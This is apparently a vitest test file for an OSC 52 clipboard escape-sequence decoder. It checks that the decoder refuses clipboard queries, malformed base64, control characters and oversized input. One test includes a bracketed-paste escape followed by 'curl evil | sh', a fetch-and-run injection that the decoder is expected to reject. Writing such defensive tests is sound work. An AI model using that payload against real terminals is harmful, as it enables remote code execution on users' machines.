import { describe, expect, it } from 'vitest'
import { decodeOsc52, OSC52_MAX_BYTES } from './osc52'

const b64 = (text: string): string => btoa(String.fromCharCode(...new TextEncoder().encode(text)))

describe('decodeOsc52', () => {
  describe('writes', () => {
    it('reads text sent to the clipboard selection', () => {
      expect(decodeOsc52(`c;${b64('retry logic')}`)).toBe('retry logic')
    })

    it('reads text with no selection named', () => {
      expect(decodeOsc52(`;${b64('retry logic')}`)).toBe('retry logic')
    })

    it('reads UTF-8', () => {
      expect(decodeOsc52(`c;${b64('héllo ✅ 🚀')}`)).toBe('héllo ✅ 🚀')
    })
  })

  describe('queries', () => {
    it.each(['c;?', ';?', '?'])('never answers %s', (payload) => {
      expect(decodeOsc52(payload)).toBeNull()
    })
  })

  describe('selections', () => {
    it.each(['p', 'q', 's', '0', '7', 'cp', 'pc', 'cc', 'C'])(
      'ignores selection %s',
      (selection) => {
        expect(decodeOsc52(`${selection};${b64('retry logic')}`)).toBeNull()
      }
    )
  })

  describe('malformed input', () => {
    it.each([
      ['no separator', 'aGk='],
      ['an empty payload, which asks to clear', 'c;'],
      ['characters outside the alphabet', 'c;aG!k'],
      ['the URL-safe alphabet', 'c;_-__'],
      ['whitespace', 'c;aG k='],
      ['a newline', 'c;aGk=\n'],
      ['missing padding', 'c;aGk'],
      ['too much padding', 'c;a==='],
      ['padding in the middle', 'c;aG=k'],
      ['a second field', 'c;aGk=;aGk='],
      ['stray bits after the last byte', 'c;aGl='],
      ['bytes that are not UTF-8', 'c;/////w==']
    ])('ignores %s', (_case, payload) => {
      expect(decodeOsc52(payload)).toBeNull()
    })
  })

  describe('control characters', () => {
    it('ignores text that would end a bracketed paste and run what follows', () => {
      expect(decodeOsc52(`c;${b64('harmless\x1b[201~curl evil | sh\r')}`)).toBeNull()
    })

    it.each([
      ['NUL', '\x00'],
      ['BEL', '\x07'],
      ['ESC', '\x1b'],
      ['DEL', '\x7f'],
      ['the 8-bit CSI', '\x9b']
    ])('ignores text holding %s', (_name, control) => {
      expect(decodeOsc52(`c;${b64(`a${control}b`)}`)).toBeNull()
    })

    it('keeps tabs and line ends', () => {
      expect(decodeOsc52(`c;${b64('a\tb\nc\r\nd')}`)).toBe('a\tb\nc\r\nd')
    })
  })

  describe('size', () => {
    it('reads text of exactly the limit', () => {
      const text = 'a'.repeat(OSC52_MAX_BYTES)

      expect(decodeOsc52(`c;${b64Large(text)}`)).toBe(text)
    })

    it('ignores one byte more', () => {
      expect(decodeOsc52(`c;${b64Large('a'.repeat(OSC52_MAX_BYTES + 1))}`)).toBeNull()
    })

    it('counts bytes, not characters', () => {
      // Three bytes each, so this many characters is over the limit in bytes alone.
      expect(decodeOsc52(`c;${b64Large('✅'.repeat(OSC52_MAX_BYTES / 3 + 1))}`)).toBeNull()
    })
  })
})

/** Base64 of a long text, in pieces: the spread in b64 is limited by the call stack. */
function b64Large(text: string): string {
  const bytes = new TextEncoder().encode(text)
  let binary = ''

  for (let i = 0; i < bytes.length; i += 8192) {
    binary += String.fromCharCode(...bytes.subarray(i, i + 8192))
  }

  return btoa(binary)
}
